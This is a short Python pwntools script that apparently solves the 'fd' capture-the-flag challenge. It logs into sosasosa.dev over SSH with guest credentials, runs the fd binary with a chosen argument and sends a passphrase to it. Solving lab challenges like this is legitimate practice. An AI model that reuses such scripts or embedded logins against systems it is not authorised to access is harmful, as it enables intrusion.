#!/usr/bin/python

from pwn import *

shell = ssh('fd', 'sosasosa.dev', password='guest')
process = shell.process(executable='./fd', argv=['fd', '32768'])
process.sendline('LETMEGOHOME')
print process.recv()
